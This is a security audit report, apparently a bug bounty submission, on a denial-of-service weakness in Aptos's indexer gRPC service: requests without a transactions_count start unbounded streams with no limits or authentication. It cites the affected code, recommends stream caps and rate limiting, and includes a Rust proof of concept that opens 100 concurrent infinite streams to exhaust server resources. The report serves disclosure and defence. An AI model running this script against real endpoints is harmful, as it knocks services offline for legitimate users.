# Audit Report

## Title
Resource Exhaustion DoS via Unbounded Infinite Transaction Streams in Indexer gRPC Service

## Summary
The `FullnodeDataService` gRPC endpoint allows clients to request infinite transaction streams by setting `transactions_count` to `None`, with no concurrent stream limits, rate limiting, or authentication. An attacker can open multiple concurrent infinite streams to exhaust server resources (memory, CPU, database connections, and tokio task scheduler), causing service degradation or complete unavailability for legitimate users.

## Finding Description

The `GetTransactionsFromNodeRequest` struct allows clients to omit the `transactions_count` field, which triggers infinite streaming behavior: [1](#0-0) 

When `transactions_count` is `None`, the implementation sets `ending_version` to `u64::MAX` (effectively 18.4 quintillion), creating an unbounded stream: [2](#0-1) 

Each incoming request spawns a dedicated tokio task that loops until `current_version < end_version`: [3](#0-2) 

Within each iteration, the coordinator spawns up to 20 blocking tasks (default `processor_task_count`) for parallel transaction processing: [4](#0-3) 

**Critical Missing Protections:**

The gRPC server configuration lacks concurrent stream limits: [5](#0-4) 

No application-layer rate limiting, connection limits, or authentication mechanisms are present in the service implementation.

**Attack Scenario:**
1. Attacker opens N concurrent gRPC connections (e.g., N=100)
2. Each sends `GetTransactionsFromNodeRequest { starting_version: Some(0), transactions_count: None }`
3. Each request spawns: 1 main tokio task + up to 20 blocking tasks per batch
4. Total resource consumption: 100 main tasks + ~2,000 concurrent blocking tasks + database I/O for 100 streams
5. Channel memory: 100 streams × 35 buffer slots × message size
6. Database contention: 100 concurrent transaction fetch operations
7. Server resources exhausted → legitimate clients cannot connect or experience severe degradation

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

## Impact Explanation

This vulnerability qualifies as **High Severity** per Aptos bug bounty criteria:
- **"API crashes"**: The indexer gRPC service becomes unresponsive or crashes under resource exhaustion
- **"Validator node slowdowns"**: If the indexer service shares resources with validator operations, performance degradation affects block processing

The indexer gRPC service is critical infrastructure for:
- Blockchain explorers and analytics platforms
- DApp backends querying transaction history
- Monitoring and alerting systems
- Data pipelines for off-chain processing

Service unavailability impacts the broader ecosystem's ability to access on-chain data, though it does not directly affect consensus or funds.

## Likelihood Explanation

**Likelihood: High**

- **No authentication required**: The gRPC endpoint is unauthenticated and publicly accessible
- **Trivial to exploit**: A simple gRPC client can open multiple concurrent streams with a few lines of code
- **No preconditions**: Attack requires no special permissions, insider access, or complex setup
- **Low attacker cost**: Minimal bandwidth and computational resources needed to maintain idle streams
- **Detection difficulty**: Appears as legitimate traffic until resource exhaustion occurs

## Recommendation

Implement multiple layers of protection:

**1. Add HTTP/2 Concurrent Stream Limits:**
```rust
// In runtime.rs, line 101
let tonic_server = Server::builder()
    .http2_keepalive_interval(Some(std::time::Duration::from_secs(60)))
    .http2_keepalive_timeout(Some(std::time::Duration::from_secs(5)))
    .http2_max_concurrent_streams(Some(50))  // Add this line
    .add_service(reflection_service_clone);
```

**2. Enforce Maximum Transaction Count:**
```rust
// In fullnode_data_service.rs, lines 83-87
const MAX_TRANSACTIONS_PER_STREAM: u64 = 10_000_000;

let ending_version = if let Some(count) = r.transactions_count {
    starting_version.saturating_add(count)
} else {
    // Cap infinite streams to a reasonable maximum
    starting_version.saturating_add(MAX_TRANSACTIONS_PER_STREAM)
};
```

**3. Implement Rate Limiting:**
- Add per-IP connection limits using a rate limiter (similar to the faucet implementation)
- Track active streams per client and enforce limits
- Add request throttling based on resource usage

**4. Add Authentication/Authorization:**
- Require API keys or bearer tokens for production deployments
- Implement tiered access with different rate limits for authenticated vs anonymous users

**5. Monitoring and Alerting:**
- Track concurrent active streams metrics
- Alert on abnormal connection patterns
- Implement circuit breakers for resource protection

## Proof of Concept

```rust
// Rust PoC: DoS via concurrent infinite streams
// File: dos_infinite_streams_poc.rs

use aptos_protos::internal::fullnode::v1::{
    fullnode_data_client::FullnodeDataClient,
    GetTransactionsFromNodeRequest,
};
use tokio::time::{sleep, Duration};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let target_url = "http://localhost:50051"; // Indexer gRPC endpoint
    let num_streams = 100; // Number of concurrent infinite streams
    
    println!("[*] Starting DoS attack with {} infinite streams", num_streams);
    
    let mut handles = vec![];
    
    for i in 0..num_streams {
        let url = target_url.to_string();
        let handle = tokio::spawn(async move {
            match FullnodeDataClient::connect(url).await {
                Ok(mut client) => {
                    println!("[+] Stream {} connected", i);
                    
                    let request = Request::new(GetTransactionsFromNodeRequest {
                        starting_version: Some(0),
                        transactions_count: None, // Infinite stream
                    });
                    
                    match client.get_transactions_from_node(request).await {
                        Ok(mut stream) => {
                            println!("[+] Stream {} receiving data...", i);
                            let mut count = 0;
                            while let Ok(Some(_response)) = stream.get_mut().message().await {
                                count += 1;
                                if count % 100 == 0 {
                                    println!("[*] Stream {} received {} batches", i, count);
                                }
                            }
                        }
                        Err(e) => println!("[-] Stream {} error: {:?}", i, e),
                    }
                }
                Err(e) => println!("[-] Stream {} connection failed: {:?}", i, e),
            }
        });
        
        handles.push(handle);
        
        // Small delay to avoid overwhelming connection setup
        sleep(Duration::from_millis(50)).await;
    }
    
    println!("[*] All streams initiated. Server resources should be exhausted.");
    println!("[*] Monitor server: CPU usage, memory, active connections");
    
    // Keep streams alive
    for handle in handles {
        let _ = handle.await;
    }
    
    Ok(())
}
```

**Expected Outcome:**
- Server CPU usage spikes to 100% across multiple cores
- Memory consumption increases significantly (multiple GB for 100 streams)
- Database connection pool exhausted
- Legitimate client requests timeout or fail with connection errors
- Service health checks fail or response times exceed SLAs

**Notes**

While HAProxy rate limiting may provide partial mitigation in production deployments, the vulnerability exists at the application level and can be exploited when:
1. The service is directly exposed (development, internal networks, misconfigurations)
2. Attackers use distributed sources to bypass per-IP limits
3. HAProxy connection limits (500 maxconn) are still sufficient to cause resource exhaustion with infinite streaming behavior

The root cause is the lack of application-level protections for unbounded resource consumption, violating fundamental DoS prevention principles for public APIs.

### Citations

**File:** protos/rust/src/pb/aptos.internal.fullnode.v1.rs (L72-75)
```rust
    /// Optional; number of transactions to return in current stream.
    /// If not set, response streams infinitely.
    #[prost(uint64, optional, tag="2")]
    pub transactions_count: ::core::option::Option<u64>,
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L83-87)
```rust
        let ending_version = if let Some(count) = r.transactions_count {
            starting_version.saturating_add(count)
        } else {
            u64::MAX
        };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L101-135)
```rust
        tokio::spawn(async move {
            // Initialize the coordinator that tracks starting version and processes transactions
            let mut coordinator = IndexerStreamCoordinator::new(
                context,
                starting_version,
                ending_version,
                processor_task_count,
                processor_batch_size,
                output_batch_size,
                tx.clone(),
                // For now the request for this interface doesn't include a txn filter
                // because it is only used for the txn stream filestore worker, which
                // needs every transaction. Later we may add support for txn filtering
                // to this interface too.
                None,
                Some(abort_handle.clone()),
            );
            // Sends init message (one time per request) to the client in the with chain id and starting version. Basically a handshake
            let init_status = get_status(StatusType::Init, starting_version, None, ledger_chain_id);
            match tx.send(Result::<_, Status>::Ok(init_status)).await {
                Ok(_) => {
                    // TODO: Add request details later
                    info!(
                        start_version = starting_version,
                        chain_id = ledger_chain_id,
                        service_type = SERVICE_TYPE,
                        "[Indexer Fullnode] Init connection"
                    );
                },
                Err(_) => {
                    panic!("[Indexer Fullnode] Unable to initialize stream");
                },
            }
            let mut base: u64 = 0;
            while coordinator.current_version < coordinator.end_version {
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L166-201)
```rust
        let mut tasks = vec![];
        for batch in task_batches {
            let context = self.context.clone();
            let filter = filter.clone();
            let task = tokio::task::spawn_blocking(move || {
                let raw_txns = batch;
                let api_txns = Self::convert_to_api_txns(context, raw_txns);
                let pb_txns = Self::convert_to_pb_txns(api_txns);
                // Apply filter if present.
                let pb_txns = if let Some(ref filter) = filter {
                    pb_txns
                        .into_iter()
                        .filter(|txn| filter.matches(txn))
                        .collect::<Vec<_>>()
                } else {
                    pb_txns
                };
                let mut responses = vec![];
                // Wrap in stream response object and send to channel
                for chunk in pb_txns.chunks(output_batch_size as usize) {
                    for chunk in chunk_transactions(chunk.to_vec(), MESSAGE_SIZE_LIMIT) {
                        let item = TransactionsFromNodeResponse {
                            response: Some(transactions_from_node_response::Response::Data(
                                TransactionsOutput {
                                    transactions: chunk,
                                },
                            )),
                            chain_id: ledger_chain_id as u32,
                        };
                        responses.push(item);
                    }
                }
                responses
            });
            tasks.push(task);
        }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L101-130)
```rust
        let tonic_server = Server::builder()
            .http2_keepalive_interval(Some(std::time::Duration::from_secs(60)))
            .http2_keepalive_timeout(Some(std::time::Duration::from_secs(5)))
            .add_service(reflection_service_clone);

        let router = match use_data_service_interface {
            false => {
                let svc = FullnodeDataServer::new(server)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip);
                tonic_server.add_service(svc)
            },
            true => {
                let svc = RawDataServer::new(localnet_data_server)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip);
                tonic_server.add_service(svc)
            },
        };

        let listener = TcpListener::bind(address).await.unwrap();
        if let Some(port_tx) = port_tx {
            port_tx.send(listener.local_addr().unwrap().port()).unwrap();
        }
        let incoming = TcpIncoming::from_listener(listener, false, None).unwrap();

        // Make port into a config
        router.serve_with_incoming(incoming).await.unwrap();
```
